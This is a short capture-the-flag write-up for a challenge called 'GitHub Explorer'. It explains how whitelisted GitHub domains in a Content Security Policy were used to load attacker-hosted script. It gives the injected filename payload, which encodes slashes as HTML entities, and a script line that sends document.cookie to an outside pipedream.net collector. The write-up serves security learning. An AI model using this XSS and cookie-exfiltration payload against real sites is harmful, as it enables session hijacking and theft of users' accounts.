# GitHub Explorer

CSP is:

`default-src 'self' *.github.com *.github.io *.githubusercontent.com; style-src 'self' https://cdn.jsdelivr.net/npm/bootstrap@4.3.1/dist/css/bootstrap.min.css; style-src-elem 'self' https://cdn.jsdelivr.net/npm/bootstrap@4.3.1/dist/css/bootstrap.min.css;`

As we can see GitHub is whitelisted, so I can host our payload there and use it to bypass CSP.

- I can then create a repository and upload our payload to it but I have also to inject js code to the page to load our payload. How? The name of the files are not filtered, but they are filenames so cannot contain slashes.
- I can use this: [https://www.w3schools.com/charsets/ref_html_ascii.asp] (i knew from a cybersecurity challenge about xss)
- Basically / became: &#47;, boom

The filename `aaa<script src="https:&#47;&#47;raw.githubusercontent.com&#47;gio-del&#47;exploit_repo_ctf&#47;main&#47;script.js">`
Then at script.js `window.location = "https://envyc0swuvvf.x.pipedream.net" + document.cookie`

Due to some "MIME Mismatch" errror, the `raw.githubusercontent.com` domain cannot be used, because it serves plain text files where it should serve javascript files.
I can't use neither `*.github.com` since it will return the github pages and not the raw file.
I tried also to use `*.github.io` hosting on github pages and it did work

Flag: flag{sp3c14L_cHAr4cT3rS_sh0ulDnt_b3_4LL0w3d_1N_f1l3nAmEs} (in fact they shouldn't)
